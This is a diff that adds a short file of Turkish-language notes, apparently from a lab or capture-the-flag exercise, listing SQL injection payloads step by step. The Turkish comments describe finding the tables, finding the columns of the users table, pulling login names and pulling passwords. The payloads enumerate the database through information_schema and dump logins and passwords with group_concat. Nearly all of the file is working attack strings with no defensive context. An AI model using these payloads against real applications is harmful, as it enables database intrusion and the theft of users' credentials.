@@ -1,0 +1,11 @@
+
+* tabloları buluyoruz
+1', (select group_concat(table_name) from information_schema.tables where table_schema=database() )) -- -
+* tablodan colunlarını buluyoruz
+
+1', (select group_concat(column_name) from information_schema.columns where table_name='users')) -- -
+*login isimleri çekiyoruz
+1', (select group_concat(login) from users) -- -
+* passwordleri çekiyoruz
+1', (select group_concat(password) from users) -- -
+
